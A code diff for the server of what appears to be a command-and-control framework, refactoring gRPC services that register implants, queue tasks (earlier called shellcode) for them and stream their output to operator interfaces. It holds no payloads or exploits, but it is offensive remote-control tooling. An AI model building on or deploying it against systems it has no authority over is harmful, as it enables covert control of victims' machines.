@@ -1,38 +1,48 @@
-use std::{collections::HashMap, sync::Arc};
+use std::collections::HashMap;
+use std::ops::Deref;
+use std::pin::Pin;
+use std::sync::Arc;
 
+use futures_core::Stream;
+use futures_util::StreamExt;
+use tokio::sync::mpsc;
 use tokio::sync::RwLock;
 use tonic::{Request, Response, Status};
 use uuid::Uuid;
 
-use crate::implant::Implant;
-use crate::Task;
+use crate::implant::{Implant, Implants};
 
 use crate::iface::{
     self, interface_service_server::InterfaceService, AddTaskRequest, AddTaskResponse,
-    ClientListRequest, ClientListResponse,
+    ImplantInfoRequest, ImplantInfoResponse,
 };
+use crate::interface::Interface;
+use crate::interface::Interfaces;
 use crate::tasks::{
-    beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, PollRequest,
-    PollResponse,
+    beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, OutputRequest,
+    OutputResponse, PollRequest, PollResponse,
 };
+use crate::utils::ImplantControl;
+use crate::utils::ImplantInfo;
 
 const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant
 
 #[derive(Debug, Default)]
 pub struct Beacon {
-    implants: RwLock<HashMap<Uuid, Implant>>,
+    implants: Implants,
+    interfaces: Interfaces,
+    running_tasks: RwLock<HashMap<Uuid, Vec<mpsc::UnboundedSender<String>>>>,
 }
 impl Beacon {
     pub fn new() -> Arc<Self> {
         Arc::new(Self::default())
     }
+}
+impl Deref for Beacon {
+    type Target = Implants;
 
-    pub async fn add_task(&self, task: Task) {
-        let map = self.implants.read().await;
-
-        for (_, val) in map.iter() {
-            val.push_task(task.clone()).await;
-        }
+    fn deref(&self) -> &Self::Target {
+        &self.implants
     }
 }
 
@@ -40,40 +50,58 @@ impl Beacon {
 impl BeaconService for Arc<Beacon> {
     async fn connection(
         &self,
-        _request: Request<ConnectionRequest>,
+        request: Request<ConnectionRequest>,
     ) -> Result<Response<ConnectionResponse>, Status> {
-        let id = Uuid::new_v4();
+        let uuid = Uuid::new_v4();
 
-        println!("Got a connection request: {id}");
+        println!("Got a connection request: {uuid}");
+        let ip = request
+            .remote_addr()
+            .ok_or(Status::not_found("Connection issue: Socket not found."))?;
 
-        let mut map = self.implants.write().await;
-        map.insert(id, Implant::default());
+        let info = ImplantInfo::new(ip, uuid);
+        self.implants.add(uuid, Implant::new(info.clone())).await;
+        self.interfaces.implant_control(ImplantControl::Add(info)).await;
 
         Ok(Response::new(ConnectionResponse {
-            uuid: id.to_string(),
+            uuid: Some(uuid.into()),
             heartbeat: HEARTBEAT,
         }))
     }
 
-    // type PollStream = Pin<Box<dyn Stream<Item = Result<PollResponse, Status>> + Send + 'static>>;
-
     async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
-        let id = Uuid::parse_str(&request.into_inner().uuid);
-        if id.is_err() {
-            return Err(Status::invalid_argument("Failed to parse uuid."));
-        }
+        let id = request.into_inner().uuid.unwrap().into();
 
-        let map = self.implants.read().await;
-        Ok(Response::new(PollResponse {
-            shellcode: match map.get(&id.unwrap()) {
-                Some(v) => v.pop_task().await,
-                None => {
-                    return Err(Status::not_found(
-                        "Client doesn't exist or isn't connected.",
-                    ))
-                }
-            },
-        }))
+        let implant = self.implants.get(&id).await.ok_or(Status::not_found(
+            "Client doesn't exist or isn't connected.",
+        ))?;
+
+        let task = implant.pop_task().await.map(|t| t.into());
+        Ok(Response::new(PollResponse { task }))
+    }
+
+    async fn output(
+        &self,
+        request: Request<tonic::Streaming<OutputRequest>>,
+    ) -> Result<Response<OutputResponse>, Status> {
+        let mut stream = request.into_inner();
+
+        while let Some(request) = stream.next().await {
+            let request = request?;
+            let task_id = request.task_uuid.unwrap().into();
+
+            let tasks = self.running_tasks.read().await;
+
+            for s in tasks
+                .get(&task_id)
+                .ok_or(Status::not_found("Running task uuid not found."))?
+                .iter()
+            {
+                s.send(request.line.clone())
+                    .map_err(|_| Status::aborted("Interface channel closed."))?;
+            }
+        }
+        Ok(Response::new(OutputResponse {}))
     }
 }
 
@@ -83,56 +111,74 @@ impl InterfaceService for Arc<Beacon> {
         &self,
         _request: Request<iface::ConnectionRequest>,
     ) -> Result<Response<iface::ConnectionResponse>, Status> {
-        let id = Uuid::new_v4();
+        let uuid = Uuid::new_v4();
 
-        println!("Got an interface connection request: {id}");
+        println!("Got an interface connection request: {uuid}");
 
-        // let mut map = self.implants.write().await;
-        // map.insert(id, Implant::default());
+        self.interfaces.add(uuid, Interface::new()).await;
 
         Ok(Response::new(iface::ConnectionResponse {
-            uuid: id.to_string(),
+            uuid: Some(uuid.into()),
         }))
     }
 
-    async fn get_list(
+    type ImplantInfoStream =
+        Pin<Box<dyn Stream<Item = Result<ImplantInfoResponse, Status>> + Send + 'static>>;
+
+    async fn implant_info(
         &self,
-        request: Request<ClientListRequest>,
-    ) -> Result<Response<ClientListResponse>, Status> {
-        let id = Uuid::parse_str(&request.into_inner().uuid);
-        if id.is_err() {
-            return Err(Status::invalid_argument("Failed to parse uuid."));
+        request: Request<ImplantInfoRequest>,
+    ) -> Result<Response<Self::ImplantInfoStream>, Status> {
+        let uuid = request.into_inner().uuid.unwrap().into();
+
+        let (tx, mut rx) = mpsc::unbounded_channel::<ImplantControl>();
+
+        // Need to send existing implants if any exist
+        for info in self.implants.list().await {
+            tx.send(info.into()).unwrap();
         }
 
-        let map = self.implants.read().await;
-        Ok(Response::new(ClientListResponse {
-            list: map.keys().map(|k| k.to_string()).collect(),
-        }))
+        self.interfaces.set_channel(uuid, tx).await.map_err(|e| Status::not_found(e.to_string()))?;
+
+        let output = async_stream::try_stream! {
+            while let Some(info) = rx.recv().await {
+                yield ImplantInfoResponse { itype: Some(info.into()) };
+            }
+        };
+        Ok(Response::new(Box::pin(output) as Self::ImplantInfoStream))
     }
+
+    type AddTaskStream =
+        Pin<Box<dyn Stream<Item = Result<AddTaskResponse, Status>> + Send + 'static>>;
 
     async fn add_task(
         &self,
         request: Request<AddTaskRequest>,
-    ) -> Result<Response<AddTaskResponse>, Status> {
+    ) -> Result<Response<Self::AddTaskStream>, Status> {
         let request = request.into_inner();
-        let id = Uuid::parse_str(&request.client_uuid);
-        if id.is_err() {
-            return Err(Status::invalid_argument("Failed to parse uuid."));
-        }
+        let id = request.client_uuid.unwrap().into();
 
-        if request.task.is_none() {
-            return Err(Status::invalid_argument("ShellCode should not be None."));
-        }
+        let task = request
+            .task
+            .ok_or(Status::invalid_argument("Task should not be None."))?;
+        let task_id = task.uuid.clone().unwrap().into();
 
-        let map = self.implants.read().await;
-        match map.get(&id.unwrap()) {
-            Some(v) => v.push_task(request.task.unwrap()).await,
-            None => {
-                return Err(Status::not_found(
-                    "Client doesn't exist or isn't connected.",
-                ))
+        let implant = self.implants.get(&id).await.ok_or(Status::not_found(
+            "Implant doesn't exist or isn't connected.",
+        ))?;
+
+        dbg!(&task);
+        implant.push_task(task.into()).await;
+
+        let (tx, mut rx) = mpsc::unbounded_channel::<String>();
+        let mut tasks = self.running_tasks.write().await;
+        tasks.insert(task_id, vec![tx]);
+
+        let output = async_stream::try_stream! {
+            while let Some(line) = rx.recv().await {
+                yield AddTaskResponse { line: Some(line) };
             }
-        }
-        Ok(Response::new(AddTaskResponse { }))
+        };
+        Ok(Response::new(Box::pin(output) as Self::AddTaskStream))
     }
 }
